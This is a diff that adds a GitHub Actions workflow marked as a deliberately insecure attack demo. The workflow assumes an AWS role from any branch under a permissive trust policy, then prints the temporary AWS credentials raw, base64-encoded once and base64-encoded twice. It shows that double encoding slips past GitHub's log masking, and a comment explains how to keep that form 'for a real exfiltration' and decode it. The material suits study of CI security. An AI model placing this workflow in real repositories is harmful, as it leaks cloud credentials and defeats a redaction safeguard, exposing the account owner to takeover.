@@ -1,0 +1,31 @@
+# ATTACK 4 (insecure on purpose). Assumes the AWS role directly from a branch,
+# accepted because the trust policy allows any branch, then prints the temporary
+# session three ways to show GitHub log masking:
+#   RAW   -> all three values are masked as ***
+#   B64x1 -> one base64 layer; the runner still recognizes and redacts the
+#            predictable parts (for example the ASIA... prefix), injecting ***
+#   B64x2 -> two layers scramble the recognizable bytes; the block survives
+# For a real exfiltration keep only the B64x2 form and decode it with:
+#   base64 -d | base64 -d
+# Rename to remove .insecure to run it.
+name: assume-demo
+on: push
+permissions:
+  id-token: write
+jobs:
+  assume:
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: aws-actions/configure-aws-credentials@v6
+        with:
+          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
+          aws-region: us-east-1
+      - name: Probe masking
+        run: |
+          creds=$(aws configure export-credentials --format env)
+          echo "=== RAW (expect *** if GitHub masks) ==="
+          printf '%s\n' "$creds"
+          echo "=== B64x1 ==="
+          printf '%s' "$creds" | base64 | tr -d '\n'; echo
+          echo "=== B64x2 ==="
+          printf '%s' "$creds" | base64 | base64 | tr -d '\n'; echo
